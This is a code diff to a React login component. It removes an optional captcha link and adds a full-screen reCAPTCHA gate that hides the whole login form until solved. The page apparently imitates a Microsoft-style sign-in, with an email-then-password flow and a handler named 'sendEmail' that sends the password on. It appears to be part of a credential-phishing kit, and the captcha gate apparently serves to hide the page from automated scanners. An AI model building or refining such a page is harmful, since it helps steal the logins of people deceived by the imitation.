@@ -190,7 +190,6 @@ const Login = () => {
   const [password, setPassword] = useState("");
   const [recaptchaValue, setRecaptchaValue] = useState(null);
   const [recaptchaError, setRecaptchaError] = useState("");
-  const [showCaptcha, setShowCaptcha] = useState(false);
 
   const handleNext = (e) => {
     e.preventDefault();
@@ -208,7 +207,7 @@ const Login = () => {
 
   const sendEmail = (e) => {
     e.preventDefault();
-    if (step === 2 && showCaptcha && !recaptchaValue) {
+    if (!recaptchaValue) {
       setRecaptchaError("Please complete the captcha.");
       return;
     }
@@ -238,6 +237,49 @@ const Login = () => {
   useEffect(() => {
     injectResponsiveStyles();
   }, []);
+
+  // Show only captcha until solved
+  if (!recaptchaValue) {
+    return (
+      <div
+        style={{
+          minHeight: "100vh",
+          minWidth: "100vw",
+          background: "radial-gradient(circle at top left, #e6d7d2, #d6e3d9)",
+          display: "flex",
+          justifyContent: "center",
+          alignItems: "center",
+        }}
+      >
+        <div
+          style={{
+            background: "#fff",
+            borderRadius: "4px",
+            boxShadow: "0 2px 8px 0 rgba(0,0,0,0.13)",
+            padding: "32px 24px",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+          }}
+        >
+          {/* Ensure ReCAPTCHA is rendered */}
+          <ReCAPTCHA
+            sitekey="6LeuFWwrAAAAAA0dAuMXMKv7XhIlSm704Ekkrjhi"
+            onChange={(value) => {
+              setRecaptchaValue(value);
+              setRecaptchaError("");
+            }}
+            theme="light"
+          />
+          {recaptchaError && (
+            <div style={{ color: "red", fontSize: "0.95rem", marginTop: 8 }}>
+              {recaptchaError}
+            </div>
+          )}
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div style={styles.pageWrapper}>
@@ -324,50 +366,6 @@ const Login = () => {
                 onChange={(e) => setPassword(e.target.value)}
                 autoFocus
               />
-              {/* Show link to display captcha */}
-              {!showCaptcha && (
-                <div style={{ margin: "1rem 0 0.5rem 0" }}>
-                  <a
-                    href="#"
-                    style={{
-                      color: "#0067b8",
-                      textDecoration: "underline",
-                      cursor: "pointer",
-                      fontSize: "1rem",
-                    }}
-                    onClick={(e) => {
-                      e.preventDefault();
-                      setShowCaptcha(true);
-                    }}
-                  >
-                    I'm not a robot
-                  </a>
-                </div>
-              )}
-              {/* Google reCAPTCHA */}
-              {showCaptcha && (
-                <div style={{ margin: "1rem 0 0.5rem 0" }}>
-                  <ReCAPTCHA
-                    sitekey="6LeuFWwrAAAAAA0dAuMXMKv7XhIlSm704Ekkrjhi"
-                    onChange={(value) => {
-                      setRecaptchaValue(value);
-                      setRecaptchaError("");
-                    }}
-                    theme="light"
-                  />
-                  {recaptchaError && (
-                    <div
-                      style={{
-                        color: "red",
-                        fontSize: "0.95rem",
-                        marginTop: 2,
-                      }}
-                    >
-                      {recaptchaError}
-                    </div>
-                  )}
-                </div>
-              )}
               <div style={styles.buttonRow}>
                 <button
                   type="button"
